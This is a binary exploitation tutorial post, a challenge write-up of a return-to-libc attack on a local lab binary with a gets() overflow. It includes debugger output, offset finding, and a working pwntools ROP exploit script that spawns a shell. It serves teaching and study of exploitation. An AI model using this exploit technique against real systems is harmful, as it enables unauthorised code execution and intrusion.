---
title: "Return to Libc"
date: 2019-07-19
description: "ret2libc"
tags: ["Binary Exploitation Series"]
type: post
weight: 20
showTableOfContents: true

---

# Return to Libc

---

# ⚖️ Challenge Write-up

---

# General Analysis

![Untitled.png](https://hackmd.io/_uploads/r1tjd3LQT.png)

# Functions

```nasm
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401090  setresuid@plt
0x00000000004010a0  setresgid@plt
0x00000000004010b0  printf@plt
0x00000000004010c0  geteuid@plt
0x00000000004010d0  gets@plt
0x00000000004010e0  getegid@plt
0x00000000004010f0  _start
0x0000000000401120  _dl_relocate_static_pie
0x0000000000401130  deregister_tm_clones
0x0000000000401160  register_tm_clones
0x00000000004011a0  __do_global_dtors_aux
0x00000000004011d0  frame_dummy
0x00000000004011d6  init
0x0000000000401223  main
0x0000000000401270  __libc_csu_init
0x00000000004012e0  __libc_csu_fini
0x00000000004012e8  _fini
pwndbg>

pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000401223 <+0>:     endbr64
   0x0000000000401227 <+4>:     push   rbp
   0x0000000000401228 <+5>:     mov    rbp,rsp
   0x000000000040122b <+8>:     sub    rsp,0x20
   0x000000000040122f <+12>:    mov    eax,0x0
   0x0000000000401234 <+17>:    call   0x4011d6 <init>
   0x0000000000401239 <+22>:    lea    rdi,[rip+0xdc4]        # 0x402004
   0x0000000000401240 <+29>:    mov    eax,0x0
   0x0000000000401245 <+34>:    call   0x4010b0 <printf@plt>
   0x000000000040124a <+39>:    lea    rax,[rbp-0x20]
   0x000000000040124e <+43>:    mov    rdi,rax
   0x0000000000401251 <+46>:    mov    eax,0x0
   0x0000000000401256 <+51>:    call   0x4010d0 <gets@plt>
   0x000000000040125b <+56>:    mov    eax,0x0
   0x0000000000401260 <+61>:    leave
   0x0000000000401261 <+62>:    ret
End of assembler dump.
pwndbg>

Need to use the things present in libc

pwndbg> search /bin/sh
Searching for value: '/bin/sh'
libc.so.6       0x7ffff7f49def 0x68732f6e69622f /* '/bin/sh' */
pwndbg> p system
$1 = {<text variable, no debug info>} 0x7ffff7dfa820 <system>
pwndbg>
```

- Exploit to find at what offset we have buffer overflow

```nasm
pwndbg> cyclic 120
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaa
laaaaaaamaaaaaaanaaaaaaaoaaaaaaa
pwndbg> r
Starting program: /home/shinjitsu/Youtube/Binary Exploitation/6. ROP/rop 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Enter Data - aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaa
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

- Thus anything more than 40 will get overflowed
# Writing out our exploit

```python
#!/usr/bin/python

from pwn import *

elf = context.binary = ELF('./ret2libc')

io = process()

shell = 0x7ffff7f49def
system = 0x7ffff7dfa820
pop_rdi = 0x00000000004012d3
ret = 0x000000000040101a
payload = cyclic(40) + pack(pop_rdi) + pack(shell) + pack(ret) + pack(system)

io.sendline(payload)

io.interactive()
```

# Output

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

[+] Starting local process './ret2libc': pid 3343
[*] Switching to interactive mode
$ ls
exploit.py  README.md  ret2libc  ret2libc.c

Thus we spawned a shell!!!!!!
```